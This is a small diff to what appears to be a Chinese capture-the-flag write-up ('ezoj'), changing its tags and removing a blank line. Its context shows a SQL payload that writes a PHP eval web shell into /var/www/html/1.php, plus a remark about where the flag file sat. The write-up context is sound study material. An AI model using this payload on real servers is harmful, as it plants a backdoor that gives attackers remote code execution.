@@ -7,7 +7,7 @@ lastmod: "2025-02-22T10:10:44"
 image: ""
 license: ""
 categories: ["赛题"]
-tags: ["jail", "php"]
+tags: ["Jail"]
 ---
 ## ezoj
 
@@ -799,7 +799,6 @@ select "<?php @eval($_POST[1]);?>" into outfile '/var/www/html/1.php'
 ```
 
 就在根目录，我一紧张没看到这个`/Ali_t1hs_1sflag_2025`
-
 
 
 
